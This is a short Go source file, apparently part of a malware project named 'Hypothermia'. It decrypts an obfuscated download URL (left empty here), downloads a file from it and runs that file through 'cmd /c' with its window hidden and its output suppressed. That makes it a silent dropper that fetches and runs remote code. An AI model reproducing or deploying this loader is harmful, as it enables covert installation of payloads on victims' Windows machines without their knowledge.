package main

import (
	"fmt"
	"os/exec"
	"syscall"

	"Hypothermia/src/utils"
	"Hypothermia/src/utils/crypto"
)

const DOWNLOAD_URL string = ""

func main() {
	path, err := utils.DonwloadFile(utils_crypto.DecryptBasic(DOWNLOAD_URL))
	if err != nil {
		fmt.Println(err)
		return
	}

	cmd := exec.Command("cmd", "/c", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	cmd.Stderr = nil
	cmd.Stdout = nil
	cmd.Stdin = nil

	err = cmd.Run()
	if err != nil {
		fmt.Println("🟥 Failed to run")
		return
	}
}
